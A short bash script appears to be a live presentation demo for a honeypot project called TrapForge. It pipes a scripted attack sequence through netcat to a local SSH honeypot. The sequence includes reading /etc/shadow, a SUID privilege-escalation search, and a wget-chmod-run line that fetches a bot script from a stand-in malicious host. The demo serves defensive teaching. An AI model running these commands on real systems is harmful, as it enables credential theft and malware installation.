#!/bin/bash
# TrapForge — Live Demo Attack Script
# Run this during the presentation: bash demo_attack.sh
# Each command appears on the dashboard in real time.

PORT=2222
HOST=localhost

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║   TrapForge — Live Attack Demo           ║"
echo "║   Connecting to SSH honeypot...          ║"
echo "╚══════════════════════════════════════════╝"
echo ""
sleep 1

{
  # Step 1 — Initial login attempt (Script Kiddie / Brute Force)
  echo "root"
  sleep 3

  # Step 2 — Reconnaissance
  echo "ls -la /etc/passwd"
  sleep 3

  # Step 3 — Credential Theft
  echo "cat /etc/shadow"
  sleep 3

  # Step 4 — Privilege Escalation
  echo "find / -perm -4000 2>/dev/null"
  sleep 3

  # Step 5 — Malware Deploy (the BIG moment — end on this)
  echo "wget http://malware.ru/bot.sh && chmod +x bot.sh && ./bot.sh"
  sleep 4

} | nc "$HOST" "$PORT"

echo ""
echo "Demo sequence complete — check the dashboard!"
